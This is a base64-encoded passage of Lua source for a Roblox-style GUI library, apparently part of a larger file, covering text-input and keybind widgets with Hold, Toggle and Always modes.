KDAsIDQsIDAsIDE5KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMTIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCA3KTsKICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKICAgICAgICAgICAgICAgICAgICBGaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWwKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0Qm94IiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBUZXh0VHJ1bmNhdGUgPSBFbnVtLlRleHRUcnVuY2F0ZS5BdEVuZDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIFBsYWNlaG9sZGVyQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgIEN1cnNvclBvc2l0aW9uID0gLTE7CiAgICAgICAgICAgICAgICAgICAgQ2xlYXJUZXh0T25Gb2N1cyA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTQsIDAsIDMwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDMzLCAzMywgMzUpCiAgICAgICAgICAgICAgICB9KTsgCgogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbnB1dCIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgMykKICAgICAgICAgICAgICAgIH0pOyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDQpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXQodGV4dCkgCiAgICAgICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ10gPSB0ZXh0CgogICAgICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXS5UZXh0ID0gdGV4dAoKICAgICAgICAgICAgICAgIGNmZy5jYWxsYmFjayh0ZXh0KQogICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIAogICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiVGV4dCIpOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgY2ZnLnNldChpdGVtc1sgImlucHV0IiBdLlRleHQpIAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpdGVtc1sgImlucHV0IiBdLkZvY3VzZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiaW5wdXQiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDI0NSwgMjQ1LCAyNDUpfSkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJpbnB1dCIgXS5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiaW5wdXQiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpfSkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGNmZy5kZWZhdWx0IHRoZW4gCiAgICAgICAgICAgICAgICBjZmcuc2V0KGNmZy5kZWZhdWx0KSAKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBjb25maWdfZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnNldAoKICAgICAgICAgICAgcmV0dXJuIHNldG1ldGF0YWJsZShjZmcsIGxpYnJhcnkpCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6a2V5YmluZChvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgZmxhZyA9IG9wdGlvbnMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpLAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLAogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciBuaWwsIAogICAgICAgICAgICAgICAgaWdub3JlX2tleSA9IG9wdGlvbnMuaWdub3JlIG9yIGZhbHNlLCAKCiAgICAgICAgICAgICAgICBrZXkgPSBvcHRpb25zLmtleSBvciBuaWwsIAogICAgICAgICAgICAgICAgbW9kZSA9IG9wdGlvbnMubW9kZSBvciAiVG9nZ2xlIiwKICAgICAgICAgICAgICAgIGFjdGl2ZSA9IG9wdGlvbnMuZGVmYXVsdCBvciBmYWxzZSwgCgogICAgICAgICAgICAgICAgb3BlbiA9IGZhbHNlLAogICAgICAgICAgICAgICAgYmluZGluZyA9IG5pbCwgCgogICAgICAgICAgICAgICAgaG9sZF9pbnN0YW5jZXMgPSB7fSwKICAgICAgICAgICAgICAgIGl0ZW1zID0ge307CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZsYWdzW2NmZy5mbGFnXSA9IHsKICAgICAgICAgICAgICAgIG1vZGUgPSBjZmcubW9kZSwKICAgICAgICAgICAgICAgIGtleSA9IGNmZy5rZXksIAogICAgICAgICAgICAgICAgYWN0aXZlID0gY2ZnLmFjdGl2ZQogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICAtLSBDb21wb25lbnQKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImtleWJpbmRfZWxlbWVudCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjQ1LCAyNDUsIDI0NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImtleWJpbmRfZWxlbWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImtleWJpbmRfZWxlbWVudCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsOwogICAgICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsQWxpZ25tZW50ID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LlJpZ2h0OwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgMTYpOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlg7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzMsIDMzLCAzNSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJrZXliaW5kX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJrZXkiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYig4NiwgODYsIDg3KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIkxTSElGVCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAia2V5YmluZF9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMTIsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAia2V5IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDEpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgfSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIE1vZGUgSG9sZGVyCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJkcm9wZG93biIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnkuaXRlbXM7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpbmxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93biIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBDbGlwc0Rlc2NlbmRhbnRzID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIyLCAyMiwgMjQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDYpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDMpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCAzKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5saW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImlubGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgb3B0aW9ucyA9IHsiSG9sZCIsICJUb2dnbGUiLCAiQWx3YXlzIn0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBjZmcueV9zaXplID0gMjAKICAgICAgICAgICAgICAgICAgICBmb3IgXywgb3B0aW9uIGluIG9wdGlvbnMgZG8gICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbmFtZSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9IG9wdGlvbjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiaW5saW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBjZmcuaG9sZF9pbnN0YW5jZXNbb3B0aW9uXSA9IG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTphcHBseV90aGVtZShuYW1lLCAiYWNjZW50IiwgIlRleHRDb2xvcjMiKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnlfc2l6ZSArPSBuYW1lLkFic29sdXRlU2l6ZS5ZCgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBuYW1lOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA1KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCBvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldChvcHRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2ZnLnNldF92aXNpYmxlKGZhbHNlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5vcGVuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgLS0gCiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5tb2RpZnlfbW9kZV9jb2xvcihwYXRoKSAtLSB0cyBzbyBmcmlraW4gdHVmZiDwn5KACiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBjZmcuaG9sZF9pbnN0YW5jZXMgZG8gCiAgICAgICAgICAgICAgICAgICAgdi5UZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzIpCiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgY2ZnLmhvbGRfaW5zdGFuY2VzW3BhdGhdLlRleHRDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXRfbW9kZShtb2RlKSAKICAgICAgICAgICAgICAgIGNmZy5tb2RlID0gbW9kZSAKCiAgICAgICAgICAgICAgICBpZiBtb2RlID09ICJBbHdheXMiIHRoZW4KICAgICAgICAgICAgICAgICAgICBjZmcuc2V0KHRydWUpCiAgICAgICAgICAgICAgICBlbHNlaWYgbW9kZSA9PSAiSG9sZCIgdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy5zZXQoZmFsc2UpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBmbGFnc1tjZmcuZmxhZ11bIm1vZGUiXSA9IG1vZGUKICAgICAgICAgICAgICAgIGNmZy5tb2RpZnlfbW9kZV9jb2xvcihtb2RlKQogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KGlucHV0KQogICAgICAgICAgICAgICAgaWYgdHlwZShpbnB1dCkgPT0gImJvb2xlYW4iIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgY2ZnLmFjdGl2ZSA9IGlucHV0CgogICAgICAgICAgICAgICAgICAgIGlmIGNmZy5tb2RlID09ICJBbHdheXMiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5hY3RpdmUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgdG9